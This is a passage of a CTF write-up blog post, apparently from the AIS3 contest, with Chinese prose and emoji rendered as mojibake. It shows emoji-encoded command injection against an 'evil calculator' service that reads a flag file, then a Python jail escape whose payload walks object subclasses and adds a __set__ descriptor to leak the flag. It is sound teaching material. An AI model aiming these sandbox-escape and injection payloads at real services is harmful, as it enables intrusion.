    <span class="string">&quot;ğŸˆµ&quot;</span>: <span class="string">&quot;æ»¿&quot;</span>,
    <span class="string">&quot;ğŸˆ¶&quot;</span>: <span class="string">&quot;æœ‰&quot;</span>,
    <span class="string">&quot;ğŸˆ·ï¸&quot;</span>: <span class="string">&quot;æœˆ&quot;</span>,
    <span class="string">&quot;ğŸš—&quot;</span>: <span class="string">&quot;car&quot;</span>,
    <span class="string">&quot;ğŸš•&quot;</span>: <span class="string">&quot;taxi&quot;</span>,
    <span class="string">&quot;ğŸš™&quot;</span>: <span class="string">&quot;SUV&quot;</span>,
    <span class="string">&quot;ğŸšŒ&quot;</span>: <span class="string">&quot;bus&quot;</span>,
    <span class="string">&quot;ğŸš&quot;</span>: <span class="string">&quot;trolleybus&quot;</span>,
    <span class="string">&quot;ğŸï¸&quot;</span>: <span class="string">&quot;race car&quot;</span>,
    <span class="string">&quot;ğŸš“&quot;</span>: <span class="string">&quot;police car&quot;</span>,
    <span class="string">&quot;ğŸš‘&quot;</span>: <span class="string">&quot;ambulance&quot;</span>,
    <span class="string">&quot;ğŸš’&quot;</span>: <span class="string">&quot;fire engine&quot;</span>,
    <span class="string">&quot;ğŸš&quot;</span>: <span class="string">&quot;minibus&quot;</span>,
    <span class="string">&quot;ğŸšš&quot;</span>: <span class="string">&quot;delivery truck&quot;</span>,
    <span class="string">&quot;ğŸš›&quot;</span>: <span class="string">&quot;articulated lorry&quot;</span>,
    <span class="string">&quot;ğŸšœ&quot;</span>: <span class="string">&quot;tractor&quot;</span>,
    <span class="string">&quot;ğŸ›´&quot;</span>: <span class="string">&quot;kick scooter&quot;</span>,
    <span class="string">&quot;ğŸš²&quot;</span>: <span class="string">&quot;bicycle&quot;</span>,
    <span class="string">&quot;ğŸ›µ&quot;</span>: <span class="string">&quot;scooter&quot;</span>,
    <span class="string">&quot;ğŸï¸&quot;</span>: <span class="string">&quot;motorcycle&quot;</span>,
    <span class="string">&quot;âœˆï¸&quot;</span>: <span class="string">&quot;airplane&quot;</span>,
    <span class="string">&quot;ğŸš€&quot;</span>: <span class="string">&quot;rocket&quot;</span>,
    <span class="string">&quot;ğŸ›¸&quot;</span>: <span class="string">&quot;UFO&quot;</span>,
    <span class="string">&quot;ğŸš&quot;</span>: <span class="string">&quot;helicopter&quot;</span>,
    <span class="string">&quot;ğŸ›¶&quot;</span>: <span class="string">&quot;canoe&quot;</span>,
    <span class="string">&quot;â›µ&quot;</span>: <span class="string">&quot;sailboat&quot;</span>,
    <span class="string">&quot;ğŸš¤&quot;</span>: <span class="string">&quot;speedboat&quot;</span>,
    <span class="string">&quot;ğŸ›³ï¸&quot;</span>: <span class="string">&quot;passenger ship&quot;</span>,
    <span class="string">&quot;â›´ï¸&quot;</span>: <span class="string">&quot;ferry&quot;</span>,
    <span class="string">&quot;ğŸ›¥ï¸&quot;</span>: <span class="string">&quot;motor boat&quot;</span>,
    <span class="string">&quot;ğŸš¢&quot;</span>: <span class="string">&quot;ship&quot;</span>,
    <span class="string">&quot;ğŸ‘¨&quot;</span>: <span class="string">&quot;man&quot;</span>,
    <span class="string">&quot;ğŸ‘©&quot;</span>: <span class="string">&quot;woman&quot;</span>,
    <span class="string">&quot;ğŸ‘¶&quot;</span>: <span class="string">&quot;baby&quot;</span>,
    <span class="string">&quot;ğŸ§“&quot;</span>: <span class="string">&quot;old man&quot;</span>,
    <span class="string">&quot;ğŸ‘µ&quot;</span>: <span class="string">&quot;old woman&quot;</span>,
    <span class="string">&quot;ğŸ’¿&quot;</span>: <span class="string">&quot;CD&quot;</span>,
    <span class="string">&quot;ğŸ“€&quot;</span>: <span class="string">&quot;DVD&quot;</span>,
    <span class="string">&quot;ğŸ“±&quot;</span>: <span class="string">&quot;phone&quot;</span>,
    <span class="string">&quot;ğŸ’»&quot;</span>: <span class="string">&quot;laptop&quot;</span>,
    <span class="string">&quot;ğŸ–¥ï¸&quot;</span>: <span class="string">&quot;pc&quot;</span>,
    <span class="string">&quot;ğŸ–¨ï¸&quot;</span>: <span class="string">&quot;printer&quot;</span>,
    <span class="string">&quot;âŒ¨ï¸&quot;</span>: <span class="string">&quot;keyboard&quot;</span>,
    <span class="string">&quot;ğŸ–±ï¸&quot;</span>: <span class="string">&quot;mouse&quot;</span>,
    <span class="string">&quot;ğŸ–²ï¸&quot;</span>: <span class="string">&quot;trackball&quot;</span>,
    <span class="string">&quot;ğŸ•¹ï¸&quot;</span>: <span class="string">&quot;joystick&quot;</span>,
    <span class="string">&quot;ğŸ—œï¸&quot;</span>: <span class="string">&quot;clamp&quot;</span>,
    <span class="string">&quot;ğŸ’¾&quot;</span>: <span class="string">&quot;floppy disk&quot;</span>,
    <span class="string">&quot;ğŸ’½&quot;</span>: <span class="string">&quot;minidisc&quot;</span>,
    <span class="string">&quot;â˜ï¸&quot;</span>: <span class="string">&quot;telephone&quot;</span>,
    <span class="string">&quot;ğŸ“Ÿ&quot;</span>: <span class="string">&quot;pager&quot;</span>,
    <span class="string">&quot;ğŸ“º&quot;</span>: <span class="string">&quot;television&quot;</span>,
    <span class="string">&quot;ğŸ“»&quot;</span>: <span class="string">&quot;radio&quot;</span>,
    <span class="string">&quot;ğŸ™ï¸&quot;</span>: <span class="string">&quot;studio microphone&quot;</span>,
    <span class="string">&quot;ğŸšï¸&quot;</span>: <span class="string">&quot;level slider&quot;</span>,
    <span class="string">&quot;ğŸ›ï¸&quot;</span>: <span class="string">&quot;control knobs&quot;</span>,
    <span class="string">&quot;â°&quot;</span>: <span class="string">&quot;alarm clock&quot;</span>,
    <span class="string">&quot;ğŸ•°ï¸&quot;</span>: <span class="string">&quot;mantelpiece clock&quot;</span>,
    <span class="string">&quot;âŒš&quot;</span>: <span class="string">&quot;watch&quot;</span>,
    <span class="string">&quot;ğŸ“¡&quot;</span>: <span class="string">&quot;satellite antenna&quot;</span>,
    <span class="string">&quot;ğŸ”‹&quot;</span>: <span class="string">&quot;battery&quot;</span>,
    <span class="string">&quot;ğŸ”Œ&quot;</span>: <span class="string">&quot;plug&quot;</span>,
    <span class="string">&quot;ğŸš©&quot;</span>: <span class="string">&quot;flag&quot;</span>,
    <span class="string">&quot;â“¿&quot;</span>: <span class="string">&quot;0&quot;</span>,
    <span class="string">&quot;â¶&quot;</span>: <span class="string">&quot;1&quot;</span>,
    <span class="string">&quot;â·&quot;</span>: <span class="string">&quot;2&quot;</span>,
    <span class="string">&quot;â¸&quot;</span>: <span class="string">&quot;3&quot;</span>,
    <span class="string">&quot;â¹&quot;</span>: <span class="string">&quot;4&quot;</span>,
    <span class="string">&quot;âº&quot;</span>: <span class="string">&quot;5&quot;</span>,
    <span class="string">&quot;â»&quot;</span>: <span class="string">&quot;6&quot;</span>,
    <span class="string">&quot;â¼&quot;</span>: <span class="string">&quot;7&quot;</span>,
    <span class="string">&quot;â½&quot;</span>: <span class="string">&quot;8&quot;</span>,
    <span class="string">&quot;â¾&quot;</span>: <span class="string">&quot;9&quot;</span>,
    <span class="string">&quot;â¿&quot;</span>: <span class="string">&quot;10&quot;</span>,
    <span class="string">&quot;â­&quot;</span>: <span class="string">&quot;*&quot;</span>,
    <span class="string">&quot;â•&quot;</span>: <span class="string">&quot;+&quot;</span>,
    <span class="string">&quot;â–&quot;</span>: <span class="string">&quot;-&quot;</span>,
    <span class="string">&quot;âœ–ï¸&quot;</span>: <span class="string">&quot;Ã—&quot;</span>,
    <span class="string">&quot;â—&quot;</span>: <span class="string">&quot;Ã·&quot;</span>

&#125;cat: flag: Is a directory
cat: templates: Is a directory
</code></pre>


<p>ç¾åœ¨æˆ‘å€‘å¾—åˆ°ä¸€å€‹jsonæœ‰æ‰€æœ‰æŒ‡ä»¤çš„å°ç…§è¡¨ï¼Œä¸¦ä¸”å¯ä»¥çŸ¥é“flagæ‡‰è©²æ˜¯åœ¨ <code>flag</code> çš„è³‡æ–™å¤¾ã€‚</p>
<p>å˜—è©¦ <code>cat</code> flag è³‡æ–™å¤¾è£¡é¢çš„æ±è¥¿ï¼Œå¯ä»¥å¾å‰›å‰› dump å‡ºä¾†çš„ json æ‰¾å¯ä»¥ç”¨çš„æŒ‡ä»¤ï¼Œé€™é‚Šä½¿ç”¨<code>;/</code>å’Œ<code>:|</code>åˆ‡å‰²æŒ‡ä»¤ï¼Œå›å‚³çš„çµæœä¼¼ä¹æ˜¯ä¸€å€‹ python file</p>
<pre><code class="highlight bash">ğŸ’¿ ğŸš©ğŸ˜“ğŸ˜‘ğŸ± â­ <span class="comment">#cd flag;/:|</span></code></pre>


<pre><code class="highlight python"><span class="comment">#flag-printer.py</span>

<span class="built_in">print</span>(<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read())</code></pre>

<ol start="3">
<li>åŸ·è¡Œpythonï¼Œget flag<pre><code class="highlight bash">ğŸ’¿ ğŸš©ğŸ˜“ğŸ˜‘ğŸâ¸ ğŸš©â–ğŸ–¨ï¸â­</code></pre></li>
</ol>
<blockquote>
<p>AIS3{ğŸ«µğŸª¡ğŸ‰ğŸ¤™ğŸ¤™ğŸ¤™ğŸ‘‰ğŸ‘‰ğŸš©ğŸ‘ˆğŸ‘ˆ}</p>
</blockquote>
<h2 id="Can-you-describe-Pyjail"><a href="#Can-you-describe-Pyjail" class="headerlink" title="Can you describe Pyjail?"></a>Can you describe Pyjail?</h2><blockquote>
<p>Yet another ğŸ â›“ï¸.<br>nc chals1.ais3.org 48763<br>Author: Vincent55</p>
</blockquote>
<p>é€™é¡Œä¸æ˜¯æˆ‘å‡ºçš„ï¼Œä½†æ˜¯ Vincent å¤§ä½¬å‡ºçš„é¡Œç›®é‚„æ˜¯è¦æ§å ´ä¸€ä¸‹</p>
<h3 id="source-code"><a href="#source-code" class="headerlink" title="source code"></a>source code</h3><p>çœ‹source codeå¯ä»¥çŸ¥é“æ˜¯å¾ˆç´”çš„pyjailï¼Œåœ¨ <code>safe_eval</code> è£¡é¢å°±æŠŠè©² ban çš„éƒ½ ban å…‰äº†</p>
<p><del>è·Ÿå‰é¢é‚£é¡Œ evil calculator æ¯”èµ·ä¾† calculator ä¸€é»éƒ½ä¸ evil</del></p>
<pre><code class="highlight python"><span class="comment">#!/usr/local/bin/python3</span>

<span class="keyword">from</span> safe_eval <span class="keyword">import</span> safe_eval
<span class="keyword">from</span> inspect <span class="keyword">import</span> getdoc


<span class="keyword">class</span> <span class="title class_">Desc</span>:
    <span class="string">&quot;&quot;&quot;</span>
<span class="string">    Welcome to my ğŸ â›“ï¸</span>
<span class="string">    &quot;&quot;&quot;</span>

    <span class="keyword">def</span> <span class="title function_">__get__</span>(<span class="params">self, objname, obj</span>):
        <span class="keyword">return</span> <span class="built_in">__import__</span>(<span class="string">&quot;conf&quot;</span>).flag

    <span class="keyword">def</span> <span class="title function_">desc_helper</span>(<span class="params">self, name</span>):
        origin = <span class="built_in">getattr</span>(<span class="built_in">type</span>, name)
        <span class="keyword">if</span> origin == <span class="built_in">type</span>.__getattribute__:
            <span class="keyword">raise</span> NameError(
                <span class="string">&quot;Access to forbidden name %r (%r)&quot;</span> % (name, <span class="string">&quot;__getattribute__&quot;</span>)
            )
        <span class="variable language_">self</span>.helper = origin


<span class="keyword">class</span> <span class="title class_">Test</span>:
    desc = Desc()


test = Test()
test.desc = <span class="string">&quot;flag&#123;fakeflag&#125;&quot;</span>


<span class="comment"># Just a tricky way to print a welcome message, or maybe a hint :/</span>
<span class="comment"># You can just `print(getdoc(Desc))`</span>
<span class="comment"># This is not part of the challenge, but if you can get the flag through here, please contact @Vincent55.</span>
welcome_msg = <span class="string">&quot;&quot;&quot;</span>
<span class="string">desctmp := Desc()</span>
<span class="string">desctmp.desc_helper(&quot;__base__&quot;)</span>
<span class="string">Obj := desctmp.helper</span>
<span class="string">desctmp := Desc()</span>
<span class="string">desctmp.desc_helper(&quot;__subclasses__&quot;)</span>
<span class="string">print(getdoc(desctmp.helper(Obj)[-2]))</span>
<span class="string">&quot;&quot;&quot;</span>.strip().replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;,&quot;</span>)
welcome_msg = <span class="string">f&quot;(<span class="subst">&#123;welcome_msg&#125;</span>)&quot;</span>

safe_eval(
    welcome_msg,
    &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;,
    &#123;<span class="string">&quot;Desc&quot;</span>: Desc, <span class="string">&quot;print&quot;</span>: <span class="built_in">print</span>, <span class="string">&quot;getdoc&quot;</span>: getdoc&#125;,
)


<span class="comment"># Your challenge begin here!</span>
payload = <span class="built_in">input</span>(<span class="string">&quot;âœï¸: &quot;</span>)

safe_eval(
    payload,
    &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;,
    &#123;<span class="string">&quot;Desc&quot;</span>: Desc&#125;,
)

<span class="comment"># print(f&quot;test.__dict__: &#123;test.__dict__&#125;&quot;)</span>
<span class="built_in">print</span>(<span class="string">f&quot;ğŸš©: <span class="subst">&#123;test.desc&#125;</span>&quot;</span>)
</code></pre>

<p>çœ‹å®Œ source code å¯ä»¥ç™¼ç¾ä»–åœ¨print <code>welcome_msg</code> çš„æ™‚å€™ç”¨äº†ä¸€å€‹éå¸¸è©­ç•°çš„æ–¹æ³•ï¼Œä¹Ÿç®—æ˜¯é€™é¡Œçš„é¡Œç¤ºã€‚</p>
<h3 id="welcome-msgåˆ°åº•åœ¨å¹¹å˜›"><a href="#welcome-msgåˆ°åº•åœ¨å¹¹å˜›" class="headerlink" title="welcome_msgåˆ°åº•åœ¨å¹¹å˜›"></a>welcome_msgåˆ°åº•åœ¨å¹¹å˜›</h3><p>é¦–å…ˆçœ‹åˆ°ä¸‹é¢é€™æ®µç¨‹å¼ç¢¼ï¼š</p>
<pre><code class="highlight python">welcome_msg = <span class="string">&quot;&quot;&quot;</span>
<span class="string">desctmp := Desc()</span>
<span class="string">desctmp.desc_helper(&quot;__base__&quot;)</span>
<span class="string">Obj := desctmp.helper</span>
<span class="string">desctmp := Desc()</span>
<span class="string">desctmp.desc_helper(&quot;__subclasses__&quot;)</span>
<span class="string">print(getdoc(desctmp.helper(Obj)[-2]))</span>
<span class="string">&quot;&quot;&quot;</span>.strip().replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;,&quot;</span>)
welcome_msg = <span class="string">f&quot;(<span class="subst">&#123;welcome_msg&#125;</span>)&quot;</span>

safe_eval(
    welcome_msg,
    &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;,
    &#123;<span class="string">&quot;Desc&quot;</span>: Desc, <span class="string">&quot;print&quot;</span>: <span class="built_in">print</span>, <span class="string">&quot;getdoc&quot;</span>: getdoc&#125;,
)</code></pre>
<p>å…¶å¯¦æœƒç™¼ç¾ä½ å¯ä»¥é€é <code>getattr(type, name)</code> å–å¾—<code>type</code>åº•ä¸‹çš„attribute<br>é€™è£¡æœƒå¡ä¸€å€‹çŸ¥è­˜é»ï¼Œå°±æ˜¯ç•¶ä½ è¦å–å¾—æŸå€‹ class çš„ subclass çš„æ™‚å€™(å‡è¨­æ˜¯ str )ï¼Œæœƒå¯« <code>str.__subclasses__()</code> ï¼Œä½†å…¶å¯¦å¯ä»¥å¯«æˆ <code>type.__subclasses__(str)</code> ï¼Œå‰ææ˜¯ <code>str</code> çš„ <code>class</code> å¿…é ˆæ˜¯ <code>type</code></p>
<p><strong>æ‰€ä»¥æˆ‘å€‘å¯ä»¥å…ˆé€é <code>getattr(type,&quot;__subclasses__&quot;)</code> å–å¾— <code>type.__subclasses__</code> å†æŠŠ <code>__base__</code> å¡é€²å»å°±å¯ä»¥å¾—åˆ° <code>type.__base__.__subclasses__()</code></strong></p>
<p>å¥½åˆ°é€™é‚Šå¤§å®¶æ‡‰è©²å·²ç¶“ææ‡‚ä¸Šé¢é‚£é™€ <code>welcome_msg</code> çš„ payload åˆ°åº•åœ¨å¹¹å˜›äº†ï¼Œç°¡å–®ä¾†èªªå°±æ˜¯åˆ° <code>object</code> è£¡é¢æŠŠæ‰€æœ‰ class æŠ“å‡ºä¾†ï¼Œç„¶å¾ŒæŠ“å€’æ•¸ç¬¬2å€‹ <code>class</code> (<code>jail.Desc</code>)æŠŠå®ƒå°å‡ºä¾†</p>
<h3 id="è§£é¡Œ"><a href="#è§£é¡Œ" class="headerlink" title="è§£é¡Œ"></a>è§£é¡Œ</h3><p>ä¸€é–‹å§‹æƒ³æ”¹æŠ“ <code>jail.Test</code> ä¸‹é¢çš„ <code>desc</code> å°±å¯ä»¥æ‹¿åˆ° <code>flag</code> äº†<br>æŠ“æ˜¯æŠ“å¾—åˆ°ï¼Œä½†æ˜¯printä¸å‡ºä¾†å•Š</p>
<pre><code class="highlight python">a = Desc();a.desc_helper(<span class="string">&quot;__base__&quot;</span>);obj=a.helper;a = Desc();a.desc_helper(<span class="string">&quot;__subclasses__&quot;</span>);obj = a.helper(obj)[-<span class="number">1</span>].desc</code></pre>

<p>é€™é‚Šåˆå¡ä¸€å€‹çŸ¥è­˜é»äº†ï¼Œé‚£å°±æ˜¯ <strong>python çš„ descriptor è§£ææœ‰å„ªå…ˆåº¦çš„å•é¡Œ</strong>(é¡Œç›®æœ‰æç¤ºdescribeï¼Œé›–ç„¶æˆ‘è¦ºå¾—æ²’æœ‰äººçœ‹å¾—æ‡‚)</p>
<p>ä»¥ä¸‹åƒè€ƒ @Vincent550102 çš„ç­†è¨˜ï¼š</p>
<blockquote>
<ul>
<li>å¦‚æœ __get__ èˆ‡ __set__ éƒ½æœ‰ï¼Œå„ªå…ˆä½¿ç”¨æè¿°å™¨ï¼ˆDescriptorï¼‰ï¼š<br>ç•¶ä¸€å€‹æè¿°å™¨åŒæ™‚å¯¦ç¾äº† __get__ å’Œ __set__ æ–¹æ³•æ™‚ï¼ŒPython æœƒèªç‚ºå®ƒæ˜¯ä¸€å€‹è³‡æ–™æè¿°å™¨ï¼ˆData Descriptorï¼‰ã€‚è³‡æ–™æè¿°å™¨çš„ä¸€å€‹ç‰¹é»æ˜¯å®ƒå€‘å°å±¬æ€§çš„è¨ªå•æœ‰æ›´é«˜çš„å„ªå…ˆç´šã€‚<br>å¦‚æœä¸æ˜¯ï¼Œå‰‡åœ¨è‡ªå·±çš„ __dict__ è£¡é¢æ‰¾ï¼š</li>
<li>å¦‚æœæè¿°å™¨æ²’æœ‰ä½œç‚ºè³‡æ–™æè¿°å™¨æˆ–è€…åªå¯¦ç¾äº† __get__ æ–¹æ³•çš„éè³‡æ–™æè¿°å™¨ï¼ˆNon-Data Descriptorï¼‰æˆ–è€…æ‰¾ä¸åˆ°æè¿°å™¨ï¼ŒPython æœƒç¹¼çºŒåœ¨ç‰©ä»¶çš„ __dict__ å±¬æ€§å­—å…¸ä¸­å°‹æ‰¾æ˜¯å¦å­˜åœ¨è©²å±¬æ€§ã€‚</li>
<li>è‹¥åœ¨ __dict__ ä¹Ÿæ‰¾ä¸åˆ°ï¼Œå˜—è©¦ç”¨æè¿°å™¨çš„ __get__ï¼š<br>å¦‚æœåœ¨ç‰©ä»¶çš„ <strong>dict</strong> ä¸­æ‰¾ä¸åˆ°è©²å±¬æ€§ï¼ŒPython æœƒæª¢æŸ¥æ˜¯å¦å­˜åœ¨åªå¯¦ç¾äº† <strong>get</strong> æ–¹æ³•çš„éè³‡æ–™æè¿°å™¨ï¼Œå¦‚æœå­˜åœ¨ï¼Œå‰‡å›å‚³è©²æè¿°å™¨çš„ __get__ æ–¹æ³•ã€‚<br>éƒ½æ²’æœ‰ï¼Œç›´æ¥å›å‚³æè¿°å™¨ï¼š</li>
<li>å¦‚æœä¸Šè¿°æ­¥é©Ÿéƒ½ç„¡æ³•æ‰¾åˆ°è©²å±¬æ€§ï¼Œæœ€å¾Œæœƒè¿”å›æè¿°å™¨ç‰©ä»¶æœ¬èº«ï¼Œå¦‚æœé€£æè¿°å™¨ä¹Ÿä¸å­˜åœ¨ï¼Œå‰‡æœƒæ‹‹å‡º AttributeErrorã€‚</li>
</ul>
</blockquote>
<p>çœ‹åˆ°é€™é‚Šï¼Œå•é¡Œå·²ç¶“è®Šå¾ˆç°¡å–®äº†ï¼Œé‚£å°±æ˜¯<strong>æˆ‘å€‘éœ€è¦å°‡ <code>__get__</code> è®Šæˆæœ€é«˜å„ªå…ˆç´š</strong>ï¼Œæ­¤æ™‚å¾Œé¢å°±ç®— fake_flag æŠŠ <code>test.desc</code> è“‹æ‰ä¹Ÿæ²’æœ‰ç”¨ï¼Œä»ç„¶æœƒå›å‚³ <code>Test.__get__()</code> çš„å…§å®¹</p>
<p>å¦‚ä½•å°‡ <code>__get__</code> è®Šæˆæœ€é«˜å„ªå…ˆç´šå‘¢ï¼Ÿ<strong>åªè¦æ–°å¢ä¸€å€‹ <code>__set__</code> å°±è¡Œäº†</strong></p>
<pre><code class="highlight python">func = <span class="keyword">lambda</span> <span class="variable language_">self</span>,obj,val:<span class="literal">None</span>
desc.__setattr__(<span class="string">&quot;__set__&quot;</span>,func)</code></pre>

<pre><code class="highlight python"><span class="comment">#payload</span>
(a := Desc(),a.desc_helper(<span class="string">&quot;__base__&quot;</span>),obj:=a.helper,a := Desc(),a.desc_helper(<span class="string">&quot;__subclasses__&quot;</span>),desc:=a.helper(obj)[-<span class="number">2</span>],a:=Desc(),a.desc_helper(<span class="string">&quot;__setattr__&quot;</span>),func:=<span class="keyword">lambda</span> <span class="variable language_">self</span>,obj,val:<span class="literal">None</span>,a.helper(desc,<span class="string">&quot;__set__&quot;</span>,func))</code></pre>
<blockquote>
<p>AIS3{y0u_kn0w_h0w_d35cr1p70r_w0rk!}</p>
</blockquote>
</main>

</article>


<script src="/js/highlight.js"></script>

  </main>
  <footer class="footer">
  
  <span>Copyright Â© TriangleSnake</span>
  
</footer>
  
<script src="/js/theme.js"></script>

</body>

</html>